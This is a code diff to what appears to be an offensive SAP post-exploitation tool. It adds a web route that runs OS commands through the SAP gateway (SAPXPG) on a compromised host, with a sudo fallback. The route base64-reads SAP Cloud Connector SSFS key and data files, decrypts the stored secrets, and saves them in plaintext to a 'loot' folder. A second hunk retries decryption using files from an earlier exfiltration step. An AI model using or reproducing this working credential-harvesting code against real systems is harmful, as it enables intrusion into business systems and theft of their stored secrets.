@@ -1626,6 +1626,47 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         from sapmap_scc_ssfs_decrypt import decrypt_and_unlock
                         d = decrypt_and_unlock(sn.keystore_loot_path)
                         _apply_ssfs_decrypt_result(host, sn, d)
+                        # The backup zip SSFS is double-encrypted by the
+                        # backup process, so decrypt_and_unlock always
+                        # returns 0 secrets from a zip.  If we got 0,
+                        # check loot dir for on-host KEY+DAT files (written
+                        # by harvest_scc_ssfs or Bundle 4 exfil) and retry.
+                        if not sn.ssfs_secrets_keys:
+                            host_slug = host.replace(":", "_").replace("/","_")
+                            loot_dir = os.path.join("loot", "scc", host_slug)
+                            key_path = os.path.join(loot_dir, "SSFS_SCC.KEY")
+                            dat_path = os.path.join(loot_dir, "SSFS_SCC.DAT")
+                            if os.path.isfile(key_path) and os.path.isfile(dat_path):
+                                print(f"[*] SCC {host}: backup SSFS gave 0 secrets "
+                                      f"— retrying with on-host files from loot/")
+                                from sapmap_scc_ssfs_decrypt import (
+                                    decrypt_ssfs_from_raw_bytes)
+                                kdata = open(key_path, "rb").read()
+                                ddata = open(dat_path, "rb").read()
+                                d2 = decrypt_ssfs_from_raw_bytes(kdata, ddata)
+                                if d2.get("ok") and d2.get("secrets"):
+                                    # Build a fake decrypt result
+                                    secrets = d2["secrets"]
+                                    sp = os.path.join(
+                                        loot_dir, "ssfs_secrets_onhost.txt")
+                                    with open(sp, "w") as _f:
+                                        for k, v in secrets.items():
+                                            _f.write(f"{k} = {v}\n")
+                                    os.chmod(sp, 0o600)
+                                    _apply_ssfs_decrypt_result(
+                                        host, sn,
+                                        {"ok": True,
+                                         "secrets_path": sp,
+                                         "secrets_keys": list(secrets.keys()),
+                                         "keystores": [],
+                                         "native_lib": "(pure-python/onhost)"})
+                                    print(f"[+] SCC {host}: on-host SSFS: "
+                                          f"{len(secrets)} secret(s) recovered")
+                            else:
+                                print(f"[*] SCC {host}: backup SSFS gave 0 "
+                                      f"secrets. Use 'Decrypt On-Host SSFS' "
+                                      f"from a co-located pwned SAP node to "
+                                      f"read the unencrypted on-host files.")
                     except Exception as de:
                         print(f"[-] SCC {host}: auto SSFS decrypt failed: {de}")
                         sapmap_findings.emit_finding(
@@ -2311,6 +2352,170 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 print(f"[-] {sid}: harvest_scc_mappings error: {e}")
             finally:
                 _task_end(f"{sid}:harvest_scc_mappings")
+
+        threading.Thread(target=_run, daemon=True).start()
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/harvest_scc_ssfs", method="POST")
+    def node_harvest_scc_ssfs(sid):
+        """Read on-host SSFS_SCC.KEY + .DAT via OS-exec and decrypt secrets.
+
+        The backup-zip SSFS is double-encrypted by the backup process.
+        The raw on-host files decrypt correctly.  This route reads them
+        directly from /opt/sap/scc/scc_config/ using base64 over SAPXPG,
+        then applies the same _apply_ssfs_decrypt_result pipeline.
+        """
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        def _run():
+            _task_start(f"{sid}:harvest_scc_ssfs",
+                        f"{sid}: Reading on-host SCC SSFS via OS-exec")
+            try:
+                from sapmap_exploit import execute_gw_command
+                import base64 as _b64
+
+                def _read_b64(path):
+                    r = execute_gw_command(node, "base64", path,
+                                          long_params="")
+                    out = "\n".join(r.get("output") or []).strip()
+                    if not out or "No such file" in out or "Permission denied" in out:
+                        # sudo fallback
+                        r2 = execute_gw_command(node, "sudo",
+                                                f"base64 {path}",
+                                                long_params="")
+                        out = "\n".join(r2.get("output") or []).strip()
+                    if not out or "No such file" in out or "Permission denied" in out:
+                        return None, out[:80]
+                    try:
+                        return _b64.b64decode(
+                            out.replace("\n","").replace("\r","")), ""
+                    except Exception as e:
+                        return None, f"b64 error: {e}"
+
+                scc_roots = ["/opt/sap/scc", "/usr/local/scc",
+                             "/opt/sapscc", "/opt/cloud-connector",
+                             "/opt/SAP/cloud-connector"]
+                scc_root = None
+                for root in scc_roots:
+                    r_ls = execute_gw_command(
+                        node, "ls",
+                        f"{root}/scc_config/SSFS_SCC.KEY",
+                        long_params="")
+                    ls_out = "\n".join(r_ls.get("output") or []).strip()
+                    if (f"{root}/scc_config/SSFS_SCC.KEY" in ls_out
+                            and "No such file" not in ls_out):
+                        scc_root = root
+                        break
+                if not scc_root:
+                    print(f"[-] {sid}: harvest_scc_ssfs — SSFS files not found")
+                    return
+
+                print(f"[*] {sid}: harvest_scc_ssfs — reading KEY+DAT from "
+                      f"{scc_root}/scc_config/")
+                key_bytes, kerr = _read_b64(
+                    f"{scc_root}/scc_config/SSFS_SCC.KEY")
+                dat_bytes, derr = _read_b64(
+                    f"{scc_root}/scc_config/SSFS_SCC.DAT")
+
+                if not key_bytes:
+                    print(f"[-] {sid}: harvest_scc_ssfs — KEY read failed: {kerr}")
+                    return
+                if not dat_bytes:
+                    print(f"[-] {sid}: harvest_scc_ssfs — DAT read failed: {derr}")
+                    return
+
+                print(f"[*] {sid}: harvest_scc_ssfs — KEY={len(key_bytes)}B "
+                      f"DAT={len(dat_bytes)}B — decrypting")
+
+                from sapmap_scc_ssfs_decrypt import decrypt_ssfs_from_raw_bytes
+                res = decrypt_ssfs_from_raw_bytes(key_bytes, dat_bytes)
+                print(f"[*] {sid}: harvest_scc_ssfs — result ok={res.get('ok')} "
+                      f"secrets={list((res.get('secrets') or {}).keys())}")
+
+                if not res.get("ok"):
+                    sapmap_findings.emit_finding(
+                        "INFO", sid,
+                        f"On-host SCC SSFS decrypt failed: {res.get('error')}",
+                        ref="scc.ssfs.onhost.failed")
+                    return
+
+                # Find (or create) the SCC node for this host
+                node_ip = (node.ip or node.hostname or "").lower()
+                scc_host = None
+                scc_node = None
+                for h, sn in api.state.scc_nodes.items():
+                    snip = (sn.ip or sn.host or h or "").lower()
+                    if snip == node_ip or h.lower() == node_ip:
+                        scc_host = h; scc_node = sn; break
+                if not scc_host:
+                    from sapmap_models import SCCNode
+                    scc_host = node_ip
+                    scc_node = SCCNode(
+                        host=scc_host, ip=node_ip,
+                        notes=f"Discovered via SSFS harvest from {sid}")
+                    api.state.scc_nodes[scc_host] = scc_node
+
+                # Save KEY+DAT to loot so future decrypt_and_unlock can use them
+                try:
+                    host_slug = scc_host.replace(":", "_").replace("/", "_")
+                    loot_dir = os.path.join("loot", "scc", host_slug)
+                    os.makedirs(loot_dir, exist_ok=True)
+                    for fname, data in [("SSFS_SCC.KEY", key_bytes),
+                                        ("SSFS_SCC.DAT", dat_bytes)]:
+                        fpath = os.path.join(loot_dir, fname)
+                        with open(fpath, "wb") as fh:
+                            fh.write(data)
+                        os.chmod(fpath, 0o600)
+                    print(f"[+] {sid}: harvest_scc_ssfs — KEY+DAT saved to "
+                          f"{loot_dir}")
+                except Exception as le:
+                    print(f"[-] {sid}: harvest_scc_ssfs — loot save error: {le}")
+
+                # Synthesise a decrypt result compatible with _apply_ssfs_decrypt_result
+                secrets = res.get("secrets") or {}
+                secrets_keys = list(secrets.keys())
+                secrets_path = os.path.join(
+                    "loot", "scc",
+                    scc_host.replace(":", "_").replace("/", "_"),
+                    "ssfs_secrets_onhost.txt")
+                try:
+                    with open(secrets_path, "w") as fh:
+                        for k, v in secrets.items():
+                            fh.write(f"{k} = {v}\n")
+                    os.chmod(secrets_path, 0o600)
+                except Exception:
+                    pass
+
+                fake_res = {
+                    "ok": True,
+                    "secrets_path": secrets_path,
+                    "secrets_keys": secrets_keys,
+                    "keystores": [],
+                    "native_lib": "(pure-python / on-host)",
+                }
+                _apply_ssfs_decrypt_result(scc_host, scc_node, fake_res)
+
+                # Emit per-secret findings
+                for k, v in secrets.items():
+                    if k == "CLOUD_CONN/JAVA_KEYSTORE_PASSWORD":
+                        scc_node.backup_password = v  # store for ks.p12 later
+                    sapmap_findings.emit_finding(
+                        "CRITICAL" if k != "CLOUD_CONN/JAVA_KEYSTORE_PASSWORD"
+                        else "HIGH",
+                        scc_host,
+                        f"SCC SSFS secret recovered (on-host): {k} = {v!r}  "
+                        f"(from {scc_root}/scc_config/ via {sid} OS-exec)",
+                        ref="scc.ssfs.onhost.secret",
+                        meta={"key": k, "source_sid": sid,
+                              "scc_root": scc_root})
+
+            except Exception as e:
+                print(f"[-] {sid}: harvest_scc_ssfs error: {e}")
+            finally:
+                _task_end(f"{sid}:harvest_scc_ssfs")
 
         threading.Thread(target=_run, daemon=True).start()
         return json.dumps({"status": "started"})
